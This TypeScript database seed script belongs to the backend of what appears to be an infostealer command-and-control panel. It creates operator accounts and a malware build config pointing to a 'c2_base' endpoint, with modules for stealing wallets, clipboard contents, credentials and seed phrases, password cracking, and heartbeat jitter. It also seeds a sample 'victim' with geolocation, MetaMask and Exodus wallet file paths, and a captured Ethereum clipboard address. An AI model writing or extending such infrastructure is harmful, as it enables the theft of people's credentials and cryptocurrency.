import 'dotenv/config';
import { PrismaClient, Role, Profile } from '@prisma/client';
import argon2 from 'argon2';
import { authenticator } from 'otplib';
import { readFile } from 'node:fs/promises';
import { buildToken, buildTokenHash, randomToken, sealSecret, sha256hex } from '../server/lib/crypto';
import { env } from '../server/lib/env';

const prisma = new PrismaClient();

const accounts: Array<{ email: string; role: Role }> = [
  { email: process.env.SEED_ADMIN_EMAIL ?? 'admin@spc.local', role: 'admin' },
  { email: 'operator@spc.local', role: 'operator' },
  { email: 'viewer@spc.local', role: 'viewer' }
];

async function main() {
  const password = process.env.SEED_ADMIN_PASSWORD ?? randomToken(18);
  const hash = await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: env.ARGON2_MEMORY_KIB,
    timeCost: env.ARGON2_TIME,
    parallelism: 1
  });

  const created: Array<{ email: string; role: Role; secret: string; uri: string }> = [];
  for (const account of accounts) {
    const secret = authenticator.generateSecret(20);
    const operator = await prisma.operator.upsert({
      where: { email: account.email },
      update: { role: account.role, passwordHash: hash, totpSecret: secret },
      create: {
        email: account.email,
        passwordHash: hash,
        role: account.role,
        totpSecret: secret,
        totpEnabled: true
      }
    });
    created.push({
      email: operator.email,
      role: operator.role,
      secret,
      uri: authenticator.keyuri(operator.email, env.TOTP_ISSUER, secret)
    });
  }

  const admin = await prisma.operator.findUniqueOrThrow({ where: { email: accounts[0].email } });
  const buildSecret = randomToken(32);
  const token = buildToken(buildSecret);
  const config = {
    schema: 1,
    build_id: '00000000-0000-4000-8000-000000000001',
    build_secret: buildSecret,
    c2_base: `${env.PUBLIC_URL}/api/v1`,
    profile: 'full',
    modules: { wallets: true, clipboard: true, credentials: true, seeds: true },
    bandwidth_kbps: 1024,
    heartbeat_sec: 30,
    poll_sec: 20,
    jitter_pct: 20,
    crack: { enabled: true, max_seconds: 90, max_cpu_pct: 50 },
    artifact: { chunk_size: 524288, max_mb: 512 }
  };

  const build = await prisma.build.upsert({
    where: { buildId: config.build_id },
    update: { tokenHash: buildTokenHash(buildSecret), secret: buildSecret, config },
    create: {
      name: 'seed-full',
      version: '0.3.4',
      profile: Profile.full,
      buildId: config.build_id,
      tokenHash: buildTokenHash(buildSecret),
      secret: buildSecret,
      config,
      status: 'ready',
      createdById: admin.id
    }
  });

  const universalConfig = JSON.parse(await readFile('universal.json', 'utf8')) as typeof config;
  const universalToken = buildToken(universalConfig.build_secret);
  const universal = await prisma.build.upsert({
    where: { buildId: universalConfig.build_id },
    update: {
      tokenHash: buildTokenHash(universalConfig.build_secret),
      secret: universalConfig.build_secret,
      config: universalConfig,
      universal: true,
      status: 'ready'
    },
    create: {
      name: 'universal',
      version: '0.3.4',
      profile: Profile.full,
      universal: true,
      buildId: universalConfig.build_id,
      tokenHash: buildTokenHash(universalConfig.build_secret),
      secret: universalConfig.build_secret,
      config: universalConfig,
      status: 'ready',
      createdById: admin.id
    }
  });

  const deviceToken = randomToken(32);
  const victim = await prisma.victim.upsert({
    where: {
      buildId_hostname_username: {
        buildId: build.id,
        hostname: 'SEED-DESKTOP',
        username: 'seed'
      }
    },
    update: { lastHeartbeatAt: new Date() },
    create: {
      buildId: build.id,
      hostname: 'SEED-DESKTOP',
      os: 'windows',
      osVersion: '10.0.19045',
      arch: 'x86_64',
      username: 'seed',
      ip: '203.0.113.7',
      country: 'Spain',
      countryCode: 'ES',
      city: 'Madrid',
      lat: 40.4168,
      lon: -3.7038,
      tags: ['seed', 'lab'],
      status: 'online',
      profile: Profile.full,
      agentVersion: '0.3.0',
      deviceTokenEnc: sealSecret(deviceToken)
    }
  });

  await prisma.wallet.createMany({
    data: [
      { victimId: victim.id, kind: 'extension', targetId: 'metamask', path: 'browsers/chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log', state: 'locked', reason: 'vault_v3_password' },
      { victimId: victim.id, kind: 'desktop', targetId: 'exodus', path: 'wallets/exodus.wallet/seed.seco', state: 'found' }
    ],
    skipDuplicates: true
  });

  await prisma.clipboardEntry.create({
    data: { victimId: victim.id, window: 'MetaMask', process: 'chrome.exe', content: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F', kind: 'eth' }
  });

  console.log('seed complete');
  console.log('password:', password);
  console.log('build_token:', token);
  console.log('device_token:', deviceToken);
  console.log('universal_build_id:', universal.id);
  console.log('universal_build_token:', universalToken);
  for (const item of created) {
    console.log(`totp ${item.email} [${item.role}]: ${item.secret}`);
    console.log(`  ${item.uri}`);
  }
  console.log(`sha256(build_token)=${sha256hex(token)}`);
}

main()
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  })
  .finally(() => prisma.$disconnect());
